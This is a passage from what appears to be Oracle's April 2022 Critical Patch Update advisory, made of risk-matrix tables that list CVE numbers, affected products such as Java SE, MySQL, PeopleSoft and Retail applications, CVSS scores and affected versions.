| CVE-2021-29425 | Oracle Insurance Rules Palette | Architecture (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 11.0.2, 11.1.0, 11.2.8, 11.3.0, 11.3.1 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516, and CVE-2021-35517.

#### Oracle Java SE Risk Matrix

This Critical Patch Update contains 7 new security patches for Oracle Java SE.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#JAVA)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-0778 | Oracle GraalVM Enterprise Edition | Node (OpenSSL) | HTTPS | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1, 22.0.0.2 |  |
| CVE-2022-21449 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Libraries | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | Oracle Java SE: 17.0.2, 18; Oracle GraalVM Enterprise Edition: 21.3.1, 22.0.0.2 |  |
| CVE-2022-21476 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Libraries | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1, 22.0.0.2 | See Note 1 |
| CVE-2022-21426 | Oracle Java SE, Oracle GraalVM Enterprise Edition | JAXP | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1, 22.0.0.2 | See Note 1 |
| CVE-2022-21496 | Oracle Java SE, Oracle GraalVM Enterprise Edition | JNDI | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1, 22.0.0.2 | See Note 1 |
| CVE-2022-21434 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Libraries | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1, 22.0.0.2 | See Note 1 |
| CVE-2022-21443 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Libraries | Multiple | Yes | 3.7 | Network | High | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1, 22.0.0.2 | See Note 1 |

#### Notes:

1. This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs.

#### Additional CVEs addressed are:

* The patch for CVE-2022-0778 also addresses CVE-2021-44531, CVE-2021-44532, CVE-2021-44533, and CVE-2022-21824.

#### Oracle JD Edwards Risk Matrix

This Critical Patch Update contains 8 new security patches for Oracle JD Edwards.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#JDE)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-42013 | JD Edwards EnterpriseOne Tools | Upgrade SEC (Apache HTTP Server) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 9.2.6.0 |  |
| CVE-2021-3711 | JD Edwards EnterpriseOne Tools | Enterprise Infrastructure (OpenSSL) | JDENET | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 9.2.6.3 |  |
| CVE-2021-3711 | JD Edwards World Security | World Software Security (OpenSSL) | HTTPS | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | A9.4 |  |
| CVE-2021-2351 | JD Edwards EnterpriseOne Tools | Database and Comm SEC (OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Prior to 9.2.6.3 |  |
| CVE-2021-2351 | JD Edwards EnterpriseOne Tools | Monitoring and Diagnostics SEC (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Prior to 9.2.6.3 |  |
| CVE-2022-21464 | JD Edwards EnterpriseOne Tools | Business Logic Infra SEC | HTTP | Yes | 8.2 | Network | Low | None | None | Un- changed | Low | None | High | Prior to 9.2.6.3 |  |
| CVE-2021-32066 | JD Edwards EnterpriseOne Tools | E1 Dev Platform Tech-Cloud (Ruby) | HTTP | Yes | 7.4 | Network | High | None | None | Un- changed | High | High | None | Prior to 9.2.6.1 |  |
| CVE-2022-21409 | JD Edwards EnterpriseOne Tools | Web Runtime | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | Prior to 9.2.6.3 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-32066 also addresses CVE-2021-31799, and CVE-2021-31810.
* The patch for CVE-2021-3711 also addresses CVE-2021-3712.

#### Oracle MySQL Risk Matrix

This Critical Patch Update contains 43 new security patches for Oracle MySQL.  11 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#MSQL)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-23305 | MySQL Enterprise Monitor | Monitoring: General (Apache Log4j) | Multiple | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.0.29 and prior |  |
| CVE-2022-22965 | MySQL Enterprise Monitor | Monitoring: General (Spring Framework) | Multiple | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.0.29 and prior | See Note 1 |
| CVE-2022-0778 | MySQL Connectors | Connector/C++ (OpenSSL) | MySQL Protocol | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-0778 | MySQL Connectors | Connector/ODBC (OpenSSL) | MySQL Protocol | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2021-42340 | MySQL Enterprise Monitor | Monitoring: General (Apache Tomcat) | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.29 and prior |  |
| CVE-2022-0778 | MySQL Enterprise Monitor | Monitoring: General (OpenSSL) | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.29 and prior |  |
| CVE-2021-22570 | MySQL Server | Server: Compiling (protobuf) | MySQL Protocol | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-0778 | MySQL Server | Server: Packaging (OpenSSL) | MySQL Protocol | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 5.7.37 and prior, 8.0.28 and prior |  |
| CVE-2022-0778 | MySQL Workbench | Workbench: libssh (OpenSSL) | MySQL Workbench | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-23181 | MySQL Enterprise Monitor | Monitoring: General (Apache Tomcat) | Multiple | No | 7.0 | Local | High | Low | None | Un- changed | High | High | High | 8.0.29 and prior |  |
| CVE-2021-44832 | MySQL Enterprise Monitor | Monitoring: General (Apache Log4j) | Multiple | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 8.0.29 and prior |  |
| CVE-2022-21454 | MySQL Server | Server: Group Replication Plugin | MySQL Protocol | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 5.7.37 and prior, 8.0.28 and prior |  |
| CVE-2022-21482 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 8.0.28 and prior |  |
| CVE-2022-21483 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.35 and prior, 7.5.25 and prior, 7.6.21 and prior, 8.0.28 and prior |  |
| CVE-2022-21489 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.35 and prior, 7.5.25 and prior, 7.6.21 and prior, 8.0.28 and prior |  |
| CVE-2022-21490 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.35 and prior, 7.5.25 and prior, 7.6.21 and prior, 8.0.28 and prior |  |
| CVE-2021-41184 | MySQL Enterprise Monitor | Monitoring: General (jQueryUI) | Multiple | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.0.29 and prior |  |
| CVE-2022-21457 | MySQL Server | Server: PAM Auth Plugin | FIDO protocols | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 8.0.28 and prior |  |
| CVE-2022-21425 | MySQL Server | Server: DDL | MySQL Protocol | No | 5.5 | Network | Low | High | None | Un- changed | None | Low | High | 8.0.28 and prior |  |
| CVE-2022-21440 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 5.5 | Network | Low | High | None | Un- changed | None | Low | High | 8.0.28 and prior |  |
| CVE-2022-21459 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 5.5 | Network | Low | High | None | Un- changed | None | Low | High | 8.0.28 and prior |  |
| CVE-2022-21478 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 5.5 | Network | Low | High | None | Un- changed | None | Low | High | 8.0.28 and prior |  |
| CVE-2022-21479 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 5.5 | Network | Low | High | None | Un- changed | Low | None | High | 8.0.28 and prior |  |
| CVE-2022-21418 | MySQL Server | InnoDB | MySQL Protocol | No | 5.0 | Network | High | High | None | Un- changed | None | Low | High | 8.0.28 and prior |  |
| CVE-2022-21417 | MySQL Server | InnoDB | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.37 and prior, 8.0.28 and prior |  |
| CVE-2022-21413 | MySQL Server | Server: DML | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21427 | MySQL Server | Server: FTS | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.37 and prior, 8.0.28 and prior |  |
| CVE-2022-21412 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21414 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21435 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21436 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21437 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21438 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21452 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21462 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21415 | MySQL Server | Server: Replication | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.28 and prior |  |
| CVE-2022-21451 | MySQL Server | InnoDB | MySQL Protocol | No | 4.4 | Network | High | High | None | Un- changed | None | None | High | 5.7.37 and prior, 8.0.28 and prior |  |
| CVE-2022-21444 | MySQL Server | Server: DDL | MySQL Protocol | No | 4.4 | Network | High | High | None | Un- changed | None | None | High | 5.7.37 and prior, 8.0.28 and prior |  |
| CVE-2022-21460 | MySQL Server | Server: Logging | MySQL Protocol | No | 4.4 | Network | High | High | None | Un- changed | High | None | None | 5.7.37 and prior, 8.0.28 and prior |  |
| CVE-2022-21484 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.35 and prior, 7.5.25 and prior, 7.6.21 and prior, 8.0.28 and prior |  |
| CVE-2022-21485 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.35 and prior, 7.5.25 and prior, 7.6.21 and prior, 8.0.28 and prior |  |
| CVE-2022-21486 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.35 and prior, 7.5.25 and prior, 7.6.21 and prior, 8.0.28 and prior |  |
| CVE-2022-21423 | MySQL Server | InnoDB | MySQL Protocol | No | 2.7 | Network | Low | High | None | Un- changed | None | None | Low | 8.0.28 and prior |  |

#### Notes:

1. The patch for CVE-2022-22965 also addresses CVE-2022-22968.

#### Additional CVEs addressed are:

* The patch for CVE-2021-41184 also addresses CVE-2021-41182, and CVE-2021-41183.
* The patch for CVE-2022-23305 also addresses CVE-2019-17571, CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.

#### Oracle PeopleSoft Risk Matrix

This Critical Patch Update contains 14 new security patches for Oracle PeopleSoft.  8 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#PS)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-3518 | PeopleSoft Enterprise PeopleTools | PeopleSoft CDA (libxml2) | HTTP | Yes | 8.8 | Network | Low | None | Required | Un- changed | High | High | High | 8.58 |  |
| CVE-2021-37714 | PeopleSoft Enterprise PeopleTools | Elastic Search (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.58, 8.59 |  |
| CVE-2021-40690 | PeopleSoft Enterprise PeopleTools | Security (Apache Santuario XML Security for Java) | HTTPS | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 8.58, 8.59 |  |
| CVE-2021-44832 | PeopleSoft Enterprise PeopleTools | Security (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 8.58, 8.59 |  |
| CVE-2022-21447 | PeopleSoft Enterprise CS Academic Advisement | Advising Notes | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | High | None | None | 9.2 |  |
| CVE-2021-43797 | PeopleSoft Enterprise PeopleTools | Elastic Search (Netty) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | 8.58, 8.59 |  |
| CVE-2022-21458 | PeopleSoft Enterprise PeopleTools | Navigation Pages, Portal, Query | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.58, 8.59 |  |
| CVE-2022-21470 | PeopleSoft Enterprise PeopleTools | Process Scheduler | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.58, 8.59 |  |
| CVE-2021-4160 | PeopleSoft Enterprise PeopleTools | Security (OpenSSL) | TLS | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 8.58, 8.59 |  |
| CVE-2022-21481 | PeopleSoft Enterprise FIN Cash Management | Financial Gateway | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 9.2 |  |
| CVE-2021-41165 | PeopleSoft Enterprise PeopleTools | Rich Text Editor (CKEditor) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 8.58, 8.59 |  |
| CVE-2022-21450 | PeopleSoft Enterprise PRTL Interaction Hub | My Links | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 9.1 |  |
| CVE-2021-44533 | PeopleSoft Enterprise PeopleTools | Elastic Search (Node.js) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 8.58, 8.59 |  |
| CVE-2020-8908 | PeopleSoft Enterprise PeopleTools | File Processing (Guava) | None | No | 3.3 | Local | Low | Low | None | Un- changed | Low | None | None | 8.58, 8.59 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-3518 also addresses CVE-2019-20388, CVE-2020-24977, CVE-2020-7595, CVE-2021-3517, and CVE-2021-3537.
* The patch for CVE-2021-41165 also addresses CVE-2021-41164.
* The patch for CVE-2021-44533 also addresses CVE-2021-44531, CVE-2021-44532, and CVE-2022-21824.
* The patch for CVE-2021-44832 also addresses CVE-2021-45105.

#### Oracle Retail Applications Risk Matrix

This Critical Patch Update contains 30 new security patches for Oracle Retail Applications.  15 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#RAPP)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-22965 | Oracle Retail Xstore Point of Service | Xenvironment (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 20.0.1, 21.0.0 |  |
| CVE-2020-13936 | Oracle Retail Xstore Office Cloud Service | Configurator (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 16.0.6, 17.0.4, 18.0.3, 19.0.2, 20.0.1 |  |
| CVE-2021-39139 | Oracle Retail Xstore Point of Service | Xenvironment (XStream) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 16.0.6, 17.0.4, 18.0.3, 19.0.2, 20.0.1 |  |
| CVE-2021-40690 | Oracle Retail Bulk Data Integration | BDI Job Scheduler (Apache Santuario XML Security For Java) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 16.0.3 |  |
| CVE-2021-37714 | Oracle Retail Customer Management and Segmentation Foundation | Segment (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 17.0-19.0 |  |
| CVE-2021-40690 | Oracle Retail Financial Integration | PeopleSoft Integration Bugs (Apache Santuario XML Security For Java) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2021-40690 | Oracle Retail Integration Bus | RIB Kernal (Apache Santuario XML Security For Java) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2021-40690 | Oracle Retail Merchandising System | Foundation (Apache Santuario XML Security For Java) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 16.0.3, 19.0.1 |  |
| CVE-2021-40690 | Oracle Retail Service Backbone | RSB Installation (Apache Santuario XML Security For Java) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2019-10086 | Oracle Retail Invoice Matching | Security (Apache Commons BeanUtils) | HTTP | Yes | 7.3 | Network | Low | None | None | Un- changed | Low | Low | Low | 16.0.3 |  |
| CVE-2021-44832 | Oracle Retail Customer Insights | Other (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 15.0.2, 16.0.2 |  |
| CVE-2021-44832 | Oracle Retail Data Extractor for Merchandising | Installer (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 15.0.2, 16.0.2 |  |
| CVE-2021-44832 | Oracle Retail EFTLink | Installation (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 17.0.2, 18.0.1, 19.0.1, 20.0.1, 21.0.0 |  |
| CVE-2021-44832 | Oracle Retail Financial Integration | PeopleSoft Integration Bugs (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1 |  |
| CVE-2021-44832 | Oracle Retail Integration Bus | RIB Kernal (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1 |  |
| CVE-2021-44832 | Oracle Retail Merchandising System | Foundation (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 16.0.3, 19.0.1 |  |
| CVE-2021-44832 | Oracle Retail Service Backbone | RSB Installation (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1 |  |
| CVE-2021-44832 | Oracle Retail Store Inventory Management | SIM Integration (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 14.0.4.13, 14.1.3.14, 14.1.3.5, 15.0.3.3, 15.0.3.8, 16.0.3.7 |  |
| CVE-2022-23437 | Oracle Retail Bulk Data Integration | BDI Job Scheduler (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 16.0.3 |  |
| CVE-2021-30129 | Oracle Retail Customer Management and Segmentation Foundation | Segment (Apache MINA SSHD) | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 18.0, 19.0 |  |
| CVE-2022-23437 | Oracle Retail Extract Transform and Load | Mathematical Operators (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 13.2.8 |  |
| CVE-2022-23437 | Oracle Retail Financial Integration | PeopleSoft Integration Bugs (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2022-23437 | Oracle Retail Integration Bus | RIB Kernal (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2022-23437 | Oracle Retail Merchandising System | Foundation (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 16.0.3, 19.0.1 |  |
| CVE-2022-23437 | Oracle Retail Service Backbone | RSB Installation (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2021-36374 | Oracle Retail EFTLink | Installation (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 19.0.1, 20.0.1 |  |
| CVE-2021-36374 | Oracle Retail Invoice Matching | Security (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 16.0.3 |  |
| CVE-2021-36374 | Oracle Retail Xstore Point of Service | Xenvironment (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 16.0.6, 17.0.4, 18.0.3, 19.0.2, 20.0.1 |  |
| CVE-2021-31812 | Oracle Retail Xstore Point of Service | Xstore Office (Apache PDFbox) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 16.0.6, 17.0.4, 18.0.3, 19.0.2, 20.0.1 |  |
| CVE-2021-34429 | Oracle Retail EFTLink | Framework (Eclipse Jetty) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 20.0.1 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-31812 also addresses CVE-2021-27807, CVE-2021-27906, and CVE-2021-31811.
* The patch for CVE-2021-36374 also addresses CVE-2021-36373.
* The patch for CVE-2021-39139 also addresses CVE-2021-29505, CVE-2021-39140, CVE-2021-39141, CVE-2021-39144, CVE-2021-39145, CVE-2021-39146, CVE-2021-39147, CVE-2021-39148, CVE-2021-39149, CVE-2021-39150, CVE-2021-39151, CVE-2021-39152, CVE-2021-39153, and CVE-2021-39154.

#### Oracle Supply Chain Risk Matrix

This Critical Patch Update contains 11 new security patches for Oracle Supply Chain.  5 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#SCP)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-23305 | Oracle Advanced Supply Chain Planning | MscObieeSrvlt (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.1, 12.2 |  |
| CVE-2022-22965 | Oracle Product Lifecycle Analytics | Installer (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 3.6.1.0 |  |
| CVE-2021-42340 | Oracle Agile PLM | Security (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 9.3.6 |  |
| CVE-2021-44832 | Oracle Agile Engineering Data Management | Installation Issues (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 6.2.1.0 |  |
| CVE-2021-44832 | Oracle Agile PLM | Security (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 9.3.6 |  |
| CVE-2021-44832 | Oracle Agile PLM MCAD Connector | CAX Client (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 3.6 |  |
| CVE-2021-44832 | Oracle Autovue for Agile Product Lifecycle Management | Internal Operations (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 21.0.2 |  |
| CVE-2022-21467 | Oracle Agile PLM | Attachments | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | High | None | None | 9.3.6 |  |
| CVE-2022-21480 | Oracle Transportation Management | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 6.4.3, 6.5.1 |  |
| CVE-2021-41165 | Oracle Agile PLM | Security (CKEditor) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 9.3.6 |  |
| CVE-2021-29425 | Oracle Agile PLM | Security (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 9.3.6 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-41165 also addresses CVE-2021-41164.
* The patch for CVE-2021-44832 also addresses CVE-2021-45105.
* The patch for CVE-2022-23305 also addresses CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.

#### Oracle Support Tools Risk Matrix

This Critical Patch Update contains 3 new security patches for Oracle Support Tools.  1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#TOOL)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
